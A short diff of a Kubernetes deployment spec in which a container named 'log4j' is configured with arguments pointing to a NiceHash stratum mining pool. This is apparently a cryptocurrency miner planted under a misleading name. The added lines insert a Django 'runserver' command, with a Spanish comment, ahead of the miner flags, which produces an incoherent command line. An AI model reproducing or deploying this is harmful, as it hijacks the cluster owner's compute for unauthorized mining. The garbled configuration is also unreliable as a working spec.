@@ -84,6 +84,10 @@ spec:
       - name: log4j
         image: "${IMAGE_REGISTRY}"
         args:
+          - "python"
+          - "manage.py"
+          - "runserver"
+          - "0.0.0.0:4412"  # Configuración para ejecutar Django en el puerto 4412
           - "--url"
           - "stratum+tcp://scrypt.auto.nicehash.com:9200"
           - "--user"
